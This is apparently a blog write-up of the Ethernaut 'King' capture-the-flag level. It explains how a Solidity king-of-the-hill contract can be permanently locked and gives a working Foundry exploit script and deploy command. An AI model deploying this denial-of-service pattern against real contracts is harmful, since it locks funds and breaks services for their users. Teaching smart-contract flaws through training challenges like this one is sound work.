---
title: 'King - The Ethernaut'
cover: https://ethernaut.openzeppelin.com/imgs/Level9.svg
categories: ["ctf"]
tags: ["blockchain","ethernaut"]
date: 2025-09-19
lastmod: 2025-09-19
---

## Challenge Overview

This level presents a simple ponzi-style game where users can become the "king" by sending more Ether than the current prize. The previous king receives the new payment, and the sender becomes the new king. The challenge is to break the game such that when the level attempts to reclaim kingship, it cannot do so.

---

## Challenge Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```

---

## Exploit Explanation

The vulnerability lies in the sequence of operations in the `receive()` function:

```solidity
receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);  // This can fail
    king = msg.sender;
    prize = msg.value;
}
```

The function:
1. Checks if the sent value is sufficient
2. **Transfers the funds to the current king**
3. **Then** updates the king and prize variables

The exploit involves creating a contract that becomes king but **cannot receive Ether**. When someone else tries to become king:

1. They send Ether to the King contract
2. The King contract tries to send the funds to our malicious contract (the current king)
3. The transfer fails because our contract cannot receive Ether
4. The entire transaction reverts, preventing the kingship change

This creates a permanent denial-of-service condition where no one can become the new king.

---

## Exploit Script

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/King.sol";

contract EvilKing {
    // Constructor becomes king by sending exactly the current prize amount
    constructor(King _kingInstance) payable {
        // Call the King contract with the exact prize amount
        // This will make this contract the new king
        (bool success, ) = address(_kingInstance).call{value: _kingInstance.prize()}("");
        require(success, "Failed to claim kingship");
    }
    
    // NO receive() or fallback() function - this contract cannot receive Ether!
}

contract KingSolution is Script {
    King public kingInstance = King(payable(<YOUR_INSTANCE>));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        // Check current king and prize before attack
        console.log("Current king:", kingInstance._king());
        console.log("Current prize:", kingInstance.prize());
        
        // Deploy EvilKing contract with exactly the current prize amount
        // This will make EvilKing the new king
        new EvilKing{value: kingInstance.prize()}(kingInstance);
        
        // Verify we are now the king
        console.log("New king:", kingInstance._king());
        console.log("My contract address:", address(this));
        
        vm.stopBroadcast();
    }
}
```

---

## Proof of Concept (PoC)

Execute the exploit with Foundry:

```bash
forge script script/KingSolution.s.sol --rpc-url $SEPOLIA_URL --tc KingSolution --broadcast
```